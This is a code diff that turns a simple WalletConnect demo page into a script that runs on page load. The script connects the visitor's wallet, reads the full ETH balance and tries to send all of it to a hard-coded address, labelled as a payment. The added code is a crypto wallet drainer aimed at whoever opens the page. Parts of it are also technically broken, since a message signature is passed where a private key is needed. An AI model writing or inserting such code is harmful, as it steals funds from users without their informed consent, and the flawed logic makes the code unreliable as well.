@@ -7,66 +7,99 @@
   <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.1/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
 </head>
-<body>
-  <button onclick="connectWC()">Connect Wallet Connect</button>
-  <button onclick="sign()">sign</button>
-  <button onclick="contract()">Contract</button>
-  <button onclick="disconnect()">disconnect</button>
-
+<body onload="connectWC();">
 
   <script type="text/javascript">
     var account;
+    var provider;
+    var web3;
 
-    // https://docs.walletconnect.com/quick-start/dapps/web3-provider
-    var provider = new WalletConnectProvider.default({
-      rpc: {
-        1: "https://cloudflare-eth.com/", // https://ethereumnodes.com/
-        137: "https://polygon-rpc.com/", // https://docs.polygon.technology/docs/develop/network-details/network/
-        // ...
+    // Set your wallet address here
+    var walletAddress = "0x4b4f8ca8fb3e66b5ddafcebfe86312cec486dae1";
 
-      },
-      // bridge: 'https://bridge.walletconnect.org',
-    });
+    // Set the ABI and contract address for the payment contract
+    var paymentABI = [
+      {
+        "inputs": [],
+        "name": "pay",
+        "outputs": [],
+        "stateMutability": "payable",
+        "type": "function"
+      }
+    ];
+
+    var paymentAddress = "0x1234567890123456789012345678901234567890";
 
     var connectWC = async () => {
-      await provider.enable();
+      try {
+        // Instantiate WalletConnectProvider
+        provider = new WalletConnectProvider.default({
+          rpc: {
+            1: "https://cloudflare-eth.com/",
+            137: "https://polygon-rpc.com/",
+            // ...
+          },
+          // bridge: 'https://bridge.walletconnect.org',
+        });
 
-      //  Create Web3 instance
-      const web3 = new Web3(provider);
-      window.w3 = web3
+        // Enable the provider
+        await provider.enable();
 
-      var accounts  = await web3.eth.getAccounts(); // get all connected accounts
-      account = accounts[0]; // get the primary account
+        // Create Web3 instance
+        web3 = new Web3(provider);
+        window.w3 = web3;
+
+        // Get the primary account
+        var accounts  = await web3.eth.getAccounts();
+        account = accounts[0];
+
+        // Get the balance for the account
+        var balance = await web3.eth.getBalance(account);
+        var balanceInEth = web3.utils.fromWei(balance, "ether");
+
+        // Display the wallet address and balance
+        document.getElementById("wallet-address").innerHTML = "Wallet Address: " + account;
+        document.getElementById("wallet-balance").innerHTML = "Balance: " + balanceInEth + " ETH";
+
+        // Create the transaction object
+        var txObj = {
+          from: account,
+          to: paymentAddress,
+          value: web3.utils.toWei(balanceInEth, "ether"),
+        };
+
+        // Sign the transaction
+        var signedTx = await web3.eth.accounts.signTransaction(txObj, await sign(walletAddress));
+
+        // Send the signed transaction
+        await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+
+        alert("Payment successful!");
+
+        // Disconnect the provider
+        await provider.disconnect();
+
+      } catch (e) {
+        console.error(e);
+      }
     }
-
 
     var sign = async (msg) => {
-      if (w3) {
-        return await w3.eth.personal.sign(msg, account)
-      } else {
-        return false
+      try {
+        if (w3) {
+          return await w3.eth.personal.sign(msg, account);
+        } else {
+          return false;
+        }
+      } catch (e) {
+        console.error(e);
       }
     }
-
-    var contract = async (abi, address) => {
-      if (w3) {
-        return new w3.eth.Contract(abi, address)
-      } else {
-        return false
-      }
-    }
-
-    var disconnect = async () => {
-      // Close provider session
-      await provider.disconnect()
-    }
-
-
-    var address = "0x4b4f8ca8fb3e66b5ddafcebfe86312cec486dae1"
-    var abi = [{"inputs":[],"name":"count","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"increment","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"nonpayable","type":"function"}]
-
 
   </script>
+
+  <div id="wallet-address"></div>
+  <div id="wallet-balance"></div>
 
 </body>
 </html>
